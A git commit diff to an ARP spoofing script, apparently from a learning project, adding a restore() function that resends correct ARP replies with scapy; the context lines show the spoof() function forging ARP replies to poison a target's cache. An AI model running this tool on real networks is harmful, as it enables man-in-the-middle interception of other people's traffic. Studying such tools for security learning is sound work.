aa507b537682ddd8175e203d365375227436c766
Lazaro Castro (Lazin) <lazarocastro@gmail.com>
2018-09-14 13:33:59 -0300

    Restore Function implemented.

--- 3-ARP_Spoofer/arp_spoof.py
+++ 3-ARP_Spoofer/arp_spoof.py
@@ -19,6 +19,12 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
+
 sent_packets_count = 0
 try:
     while True:
@@ -29,6 +35,6 @@ try:
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ..... Quitting.")
+    print("\n[+] Detected CTRL + C ..... Quitting.\n")
 
 
